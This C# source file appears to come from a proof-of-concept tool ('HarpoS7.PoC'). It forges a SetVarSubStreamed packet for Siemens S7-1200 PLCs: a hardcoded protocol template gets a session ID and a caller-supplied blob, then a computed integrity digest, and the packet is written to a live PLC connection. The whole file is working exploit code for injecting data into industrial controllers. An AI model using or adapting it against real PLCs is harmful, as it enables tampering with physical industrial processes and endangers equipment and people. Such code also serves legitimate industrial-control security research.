using System.Buffers.Binary;
using HarpoS7.Integrity;

namespace HarpoS7.PoC.Packets;

public class SetVarSubStreamedRequest
{
    private readonly byte[] _sessionKey;
    private readonly byte[] _blob;
    private readonly uint _sessionId;

    private static readonly byte[] S71200Data =
    [
        0x03, 0x00, 0x01, 0x62, 0x02, 0xF0, 0x80, 0x72, 0x03, 0x01, 0x53, 0x20,
	    0x9A, 0x29, 0x90, 0x0B, 0x5A, 0x14, 0x9F, 0x31, 0xE4, 0xB5, 0xDA, 0xD4,
	    0x8F, 0x2A, 0x7A, 0x48, 0xBA, 0x85, 0xD0, 0x98, 0x84, 0xAE, 0x12, 0x42,
	    0xC6, 0x28, 0x3B, 0xF9, 0xBB, 0xAA, 0xE2, 0x6E, 0x31, 0x00, 0x00, 0x05,
	    0x7C, 0x00, 0x00, 0x00, 0x04, 0x70, 0x40, 0x00, 0x00, 0x34, 0x70, 0x40,
	    0x00, 0x00, 0x20, 0x04, 0x01, 0x8E, 0x36, 0x00, 0x00, 0x04, 0xE8, 0x89,
	    0x69, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x89, 0x6A, 0x00, 0x13, 0x00,
	    0x89, 0x6B, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x14, 0x00, 0x81,
	    0x78, 0xEF, 0xBE, 0xAD, 0xDE, 0x7C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00,
	    0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x73, 0x08, 0x1F, 0x09, 0x6B, 0x42,
	    0xBD, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2F, 0xB8, 0x46,
	    0xC1, 0xF4, 0x78, 0xFE, 0xB0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	    0x00, 0x3C, 0x00, 0x00, 0x00, 0xDE, 0xFC, 0xE0, 0xE5, 0x0B, 0xED, 0x8B,
	    0x8A, 0xA8, 0xC8, 0x8F, 0xEC, 0xCB, 0x0A, 0xA8, 0x41, 0x25, 0xEA, 0x80,
	    0xF6, 0x97, 0x56, 0x1E, 0xCB, 0x1A, 0xA3, 0xEF, 0x70, 0x7A, 0x7A, 0xCF,
	    0x18, 0xA7, 0xD5, 0x29, 0xFE, 0x21, 0x9D, 0x55, 0xE7, 0x2D, 0x2D, 0x2D,
	    0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
	    0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0xEF, 0xBE, 0xAD, 0xDE, 0x00, 0x00, 0x00,
	    0x00, 0x40, 0x00, 0x00, 0x00, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25,
	    0x25, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, 0xB7, 0xC9, 0xC2,
	    0x84, 0xBD, 0xC8, 0x5B, 0x31, 0x66, 0x93, 0x7B, 0x26, 0x92, 0xDB, 0x32,
	    0x9C, 0xDE, 0x73, 0x4E, 0x40, 0x34, 0x18, 0xE5, 0xBB, 0xCC, 0x45, 0x0D,
	    0x0B, 0xE5, 0xD3, 0xA7, 0x76, 0x7B, 0x6A, 0xEC, 0x2F, 0x60, 0x3D, 0xAA,
	    0xE0, 0x15, 0x61, 0x57, 0x48, 0x5A, 0x84, 0x2A, 0x7D, 0xEF, 0xBE, 0xAD,
	    0xDE, 0x01, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0xC4, 0x6E, 0x9C,
	    0x19, 0x4E, 0x78, 0x15, 0xA3, 0x92, 0xE8, 0x68, 0xCA, 0x9D, 0xAD, 0xA9,
	    0xAA, 0xBA, 0x2E, 0x60, 0xEB, 0x7E, 0x70, 0xD3, 0x01, 0xEF, 0xBE, 0xAD,
	    0xDE, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	    0x00, 0x00, 0x72, 0x03, 0x00, 0x00
    ];
    
    public SetVarSubStreamedRequest(byte[] sessionKey, byte[] blob, uint sessionId)
    {
        _sessionKey = sessionKey;
        _blob = blob;
        _sessionId = sessionId;
    }

    public void WriteRealPlc(Stream stream)
    {
        const int integrityOffset = 0x0C;
        const int dataOffset = 0x2C;
        const int dataLength = 0x132;
        const int blobOffset = 0x61;
        const int sessionIdOffset = 0x35;
        
        Span<byte> buffer = stackalloc byte[S71200Data.Length];
        S71200Data.CopyTo(buffer);
        
        BinaryPrimitives.WriteUInt32BigEndian(buffer[sessionIdOffset..], _sessionId);
        BinaryPrimitives.WriteUInt32BigEndian(buffer[(sessionIdOffset + 5)..], _sessionId);
        
        // Blob data
        _blob.CopyTo(buffer[blobOffset..]);
        
        // Integrity
        HarpoPacketDigest.CalculateDigest(
            buffer[integrityOffset..], 
            buffer.Slice(dataOffset, dataLength), 
            _sessionKey.AsSpan()
        );
        
        stream.Write(buffer);
    }
}